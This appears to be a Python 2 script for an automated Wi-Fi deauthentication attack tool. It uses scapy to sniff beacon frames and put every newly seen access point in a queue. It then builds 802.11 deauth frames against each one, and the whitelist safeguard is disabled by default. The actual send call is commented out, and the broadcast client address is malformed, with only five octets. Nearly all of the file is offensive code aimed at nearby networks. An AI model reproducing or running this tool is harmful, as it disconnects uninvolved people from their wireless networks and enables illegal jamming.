#!/usr/bin/env python
import sys,os,thread,time
from scapy.all import *
import random # Can remove after completion
import Queue
import pyric
import pyric.pyw as pyw
import pyric.lib.libnl as nl

# Global Variables
play_nice = False
attack_queue = Queue.Queue()
ap_list = []
attack_list = []
capture = time.strftime("%Y.%m.%d-%H.%M.%S.pcap")
pktdump = PcapWriter("./logs/" + capture, append=True,sync=True)
iface = "wlan0"
client = "FF:FF:FF:FF:FF"
count = 4

# Probing will continually sniff for new Beacons and EAPOL while recording in pcap file.
def ProbingBeacons(pkt) :
  if pkt.haslayer(Dot11) :
		if pkt.haslayer(Dot11Auth) or pkt.haslayer(Dot11Beacon):
			pktdump.write(pkt)
			ap_channel = str(ord(pkt[Dot11Elt:3].info))
			#print "BSSID: %s , Channel: %s" % (pkt.addr2,ap_channel)
			if pkt.addr2 not in ap_list:
				ap_list.append(pkt.addr2)
				if play_nice == True:
					PlayNice(pkt.addr2,ap_channel)
				else:
					attack_queue.put((pkt.addr2,ap_channel))

# Scapy's Sniffing service - wlan0 should be the primary card for sniffing.
def Sniffing():
	sniff(iface="wlan0", prn=ProbingBeacons, store=0)

# Main attacking function.
def GetAngry(data):
	(bssid,channel) = data
	if bssid not in attack_list:
		print "Attacking BSSID: %s on Channel %s" % (bssid, channel)
		SetIfaceChannel('wlan0',channel)
		Deauth(bssid)
		# Random sleep time between 1 and 5 to test for wireless card change time
		attack_list.append(bssid)

	elif bssid in attack_list:
		print "Already Attacked BSSID: %s" % bssid
	else:
		print "Something went wrong"

# PlayNice will check to make sure the BSSID is on the whitelist.
def PlayNice(bssid,channel):
	if bssid in whitelist:
		print "Approved SSID... Attack!"
		attack_queue.put((bssid,channel))
	else:
		print "Avoiding FCC Violations."

# TimeSink will add APs to Queue as seen and pop them off as completed. 
def TimeSink():
	while True:
		if attack_queue.empty():
			time.sleep(5)
		elif not attack_queue.empty():
			GetAngry(attack_queue.get())
		else:
			print "Something went wrong"

# Make sure the Interfaces that are being utilized are in Monitor Mode
def SetMonitorMode(iface,action):
	print pyw.modeget(iface)
	if action == "monitor":
		# check to make sure the card isn't already in monitor mode
		if pyw.modeget(iface) == 'monitor':
			print "Card is already in monitor Mode"
		else:
			print "Putting card into monitor mode"
			pyw.modeset(iface,action)

	elif action == "managed":
		# check to make sure the card isn't already in managed mode
		if pyw.modeget(iface) == 'managed':
			print "Card is already in managed Mode"
		else:
			print "Putting card into managed mode"
			pyw.modeset(iface,action)
	else:
		print "Unrecongnized command"


# Changes the Interface (typically of wlan1) to make sure it's listening for the EAPOL Packets. 
def SetIfaceChannel(iface,channel):
	print "Changing %s to channel %s" % (iface,channel)
	print pyw.chset(iface,str(channel),None)


# Check Interfaces - Make sure there is at least two Wireless Cards that support Monitor Mode
def CheckInterfaces():
	if len(pyw.winterfaces()) <=2:
		print "Not Angry Enough"
	else:
		print "That's my secret cap'n I'm always angry!"

# Deauth is the Python implementation of sending deauth packets with Scapy
def Deauth(bssid):
	packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
	for n in range(int(count)):
		#sendp(packet)
		print 'Deauth sent via: ' + iface + ' to BSSID: ' + bssid + ' for Client: ' + client


# Start the application and the threads.
if __name__ == "__main__":
	f = open('whitelist.txt')
	whitelist = f.readlines()

	try:
		print "Sniffing for Beacon Frames..."
		thread.start_new(Sniffing, ())
		thread.start_new(TimeSink, ())

		while True:
			time.sleep(5)
			print "Captured APs: %i" % len(ap_list)
			print "Attacked APs: %i" % len(attack_list)
			print "Queue Length: %i" % attack_queue.qsize()
			print "Whitelist Length: %i" % len(whitelist)

	except KeyboardInterrupt:
		sys.exit("\n Exiting...")
